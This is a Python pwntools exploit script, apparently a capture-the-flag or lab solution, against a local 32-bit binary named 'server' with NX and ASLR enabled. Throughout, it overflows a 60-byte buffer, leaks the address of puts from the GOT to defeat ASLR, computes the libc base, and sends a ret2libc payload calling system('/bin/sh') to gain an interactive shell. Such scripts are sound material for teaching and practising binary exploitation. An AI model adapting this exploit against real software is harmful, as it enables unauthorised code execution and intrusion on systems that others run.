import struct
import pwn

# server is a 32-bit dynamically-linked binary
# NX is enabled; ASLR is turned on

# This is a basic rop with puts(puts got) and then a ret2libc but in 32-bit land

target = pwn.process('./server')
#gdb.attach(target)

libc_elf = pwn.ELF('/lib/i386-linux-gnu/libc.so.6')
target_elf = pwn.ELF('server')


#####################################
#### Leaking Address of puts got ####
#####################################

vuln_func_addr = target_elf.symbols['vuln'] # Address of the start of vuln() so we can loop back over

puts_plt = target_elf.symbols['puts']
puts_got = target_elf.got['puts']

leak_payload = b'a' * 60 # Buffer overflow is 60 bytes
leak_payload += struct.pack("<I", puts_plt) # We are in 32-bit land, so puts() will use whatever is on top of the stack as its parameter. No need for pop rdi buisness
leak_payload += struct.pack("<I", vuln_func_addr) # This is what will be popped as the return address by puts()
leak_payload += struct.pack("<I", puts_got) # The argument for puts()

target.sendline(leak_payload)

for i in range(0,2):
    target.recvuntil(b'Return address:')

for i in range(0,2):
    target.recvline()

leak = target.recv(4)
puts_libc_addr = struct.unpack("<I", leak)[0]

##############################################################
#### Calculating base address of libc and sending payload ####
##############################################################

libc_puts_offset = libc_elf.symbols['puts']
libc_system_offset = libc_elf.symbols['system']
libc_bin_sh_offset = next(libc_elf.search(b'/bin/sh'))

libc_base = puts_libc_addr - libc_puts_offset

print(f"libc base addr: {hex(libc_base)}")

final_payload = b'a' * 60
final_payload += struct.pack("<I", libc_base + libc_system_offset)
final_payload += struct.pack("<I", 0x0) # The return address for system(). Can just be 0 because we will never reach it
final_payload += struct.pack("<I", libc_base + libc_bin_sh_offset) # argument for system()

target.sendline(final_payload)
target.interactive()